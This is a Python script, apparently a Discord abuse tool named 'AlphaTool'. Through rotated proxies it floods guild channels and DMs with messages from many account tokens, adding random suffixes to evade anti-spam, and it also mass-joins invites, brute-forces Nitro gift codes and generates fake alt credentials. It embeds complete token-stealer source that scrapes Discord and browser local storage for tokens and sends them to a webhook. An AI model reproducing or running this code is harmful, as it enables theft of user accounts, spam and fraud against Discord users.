import re
import sys

import setting
import os
import json
import random
import requests
import urllib3
import time
from urllib3.exceptions import InsecureRequestWarning

# coding: utf-8
# -*- coding: utf-8 -*-
Choice = random.choice
#   if (os.path.exists('Userid.txt')):
#      Userids = open("Userid.txt", encoding='utf-8').read().splitlines()
# else:
#    f = open('Userid.txt', 'w', encoding='utf-8').read().splitlines()
#   f.close()
# Dm


# チャンネルid
# if (os.path.exists('channelid.txt')):
#    linkw = open("channelid.txt").read().splitlines()
# else:
#  f = open('channelid.txt', 'w')
#   f.close()
#  if (os.path.exists('WebhookURL.txt')):
#     webs = open("WebhookURL.txt").read().splitlines()
# else:
#   f = open('WebhookURL.txt', 'w')
#  f.close()
def request_new_proxy():
    if (os.path.exists('Proxy.txt')):
        r = requests.get(
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            timeout=20)
        f3 = open("Proxy.txt", 'wb')
        f3.write(r.content)
        f3.close()
        f2 = open("Proxy.txt").read().splitlines()
    for proxy in f2:
        proxyss = {

            "http_proxy": f"http://{proxy}",
            "https_proxy": f"http://{proxy}"

        }
    return proxyss


def start_spam():
    global src, f2
    message = setting.user_text

    if (os.path.exists('Token.txt')):
        tokenlist = open("Token.txt").read().splitlines()
    else:
        f = open('Token.txt', 'w')
        f.close()
    if (os.path.exists('Channel.txt')):
        linkw = open("Channel.txt").read().splitlines()
    else:
        f = open('Channel.txt', 'w')
        f.close()
    if (os.path.exists('Dmid.txt')):
        passdmw = open("Dmid.txt").read().splitlines()
    else:
        f = open('Dmid.txt', 'w')
        f.close()
    with open('./Setting.json', 'r') as handle:
        config = json.load(handle)
        webs = config["Webhook"]
        delay = config['Delay']
        reaction = config['Reaction']
        reactionurl = config['ReactionURL']
        syoutai = config['DiscordInvitationlink']
        antispamban = config['AntiSpamBan']
        userid = config['UserName']
        server = config['ServerID']
        genkaisuu = config['NitroGen']
        autotoken = config['TokenLoggerCrater']
        AllChannelSpam = config['AllChannelSpam']
        MinecraftAltCrater = config['AltCrater']

    if (os.path.exists('Proxy.txt')):
        r = requests.get(
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            timeout=20)
        r3 = requests.get(
            "http://alexa.lr2b.com/proxylist.txt",
            timeout=20)
        f3 = open("Proxy.txt", 'wb')
        f3.write(r.content)
        f3.write(r3.content)
        f3.close()
        f2 = open("Proxy.txt").read().splitlines()

    else:
        f5 = open('Proxy.txt', 'w+')
        f5.close()

    # 処理

    while True:

        for proxy in f2:
            print("4")

            for token in tokenlist:
                backup = message
                code = "".join(
                    random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in
                    range(8))
                code.replace(code, "", 1)
                if antispamban == "True":
                    message += code
                else:
                    pass
                proxyss = {

                    "http_proxy": f"http://{proxy}",
                    "https_proxy": f"http://{proxy}"

                }

                request = requests.Session()

                if server == "":
                    pass
                else:

                    chanjson = request.get(f"https://discord.com/api/v9/guilds/{server}/channels",
                                           headers={
                                               'authorization': token,
                                               'content-Type': 'application/json'
                                           }, proxies=proxyss, verify=False)

                    channellist = json.loads(chanjson.content)
                    if AllChannelSpam == "True":
                        for channel in channellist:
                            try:

                                src = request.post(
                                    f"https://discord.com/api/v9/channels/{channel['id']}/messages",

                                    headers={
                                        'authorization': token,
                                        'content-Type': 'application/json'
                                    }, json={"content": message, "tts": False}, proxies=proxyss, verify=False)

                            except:
                                print("error")
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(
                                    float(ratelimit['retry_after'] / 1000))
                                print("b")
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                write_error(
                                    token, error['message'], error['code'])
                                print("c")
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                write_error(
                                    token, error['message'], error['code'])
                                print("d")
                                sys.exit()
                            elif src.status_code == 403:
                                error = json.loads(src.content)
                                write_error(
                                    token, error['message'], error['code'])
                                print("e")

                    else:
                        pass

                print(syoutai)

                uzai = request.post(f"https://discord.com/api/v9/invites/{syoutai}", headers={
                    'authorization': token
                }, proxies=proxyss, verify=False)
                print(uzai)
                if reaction == "PUT":
                    print("ha")
                    request.put(reactionurl, headers={
                        'authorization': token,
                        'content-Type': 'application/json'
                    }, proxies=proxyss, verify=False)
                elif reaction == "DELETE":
                    request.delete(reactionurl, headers={
                        'authorization': token,
                        'content-Type': 'application/json'
                    }, proxies=proxyss, verify=False)
                else:
                    pass

                if "#" in userid:
                    user = userid.split("#")
                    payload = {"username": user[0], "discriminator": user[1]}
                    src = request.post('https://discord.com/api/v9/users/@me/relationships', headers={
                        'authorization': token
                    },
                        json={"username": user[0], "discriminator": user[1]}, proxies=proxyss,
                        verify=False)

                for passdm in passdmw:

                    if passdm == "":
                        pass
                    else:
                        request.post(f'https://discord.com/api/v9/channels/{passdm}/messages',
                                     headers={'authorization': token},
                                     data={
                                         "content": message
                                     }, proxies=proxyss, verify=False)
                for channelids in linkw:
                    if channelids == "":
                        pass
                    else:
                        print(channelids)

                        request.post(f"https://discord.com/api/v9/channels/{channelids}/messages",
                                     headers={
                                         'authorization': token
                                     }, data={
                                         "content": message
                                     }, proxies=proxyss, verify=False)
                altcode = "".join(
                    random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.") for _ in
                    range(13))
                altpass = "".join(
                    random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.!") for _ in
                    range(15))
                if autotoken == "True":
                    tokenloggermain = """WEBHOOK_URL = 'あなたのWebhookを入れてね！'
PING_ME = False


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
 
    
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'


        headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
}

        payload = json.dumps({'content': message})

        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
              pass

if __name__ == '__main__':
    main()
"""
                    try:
                        requests.post(webs, json={
                            "content": f"あるふぁふぁふぁふぁふぁ\n\n{tokenloggermain}",
                            "username": "AlphaTool",
                            "avatar_url": "https://cdn.discordapp.com/avatars/899801465965654056/f54196b91dfc56f7d4622f968bc7dea7.png?size=60"},
                            proxies=proxyss)
                    except:
                        pass

                else:
                    pass
                for alt in range(MinecraftAltCrater):
                    alt = f'{altcode}@gmail.com:{altpass}'
                    try:
                        requests.post(webs, json={
                            "content": f"使えるかは知りません！！\n\n{alt}",
                            "username": "AlphaTool",
                            "avatar_url": "https://cdn.discordapp.com/avatars/899801465965654056/f54196b91dfc56f7d4622f968bc7dea7.png?size=60"},
                            proxies=proxyss)
                    except:
                        pass
                print("2")
                iterate = 1
                code = "".join(
                    random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in
                    range(16))
                for nit in range(genkaisuu):

                    try:
                        req = requests.get(
                            f'https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true',
                            timeout=1)

                        if req.status_code == 200:


                            try:
                                requests.post(webs, json={
                                    "content": f"当たりました！！おめでとう！！\n\nhttps://discord.gift/{code}",
                                    "username": "AlphaTool",
                                    "avatar_url": "https://cdn.discordapp.com/avatars/899801465965654056/f54196b91dfc56f7d4622f968bc7dea7.png?size=60"})
                            except:
                                pass

                    except KeyboardInterrupt:
                        return

                message = backup
                time.sleep(float(delay))


if __name__ == '__main__':
    start_spam()
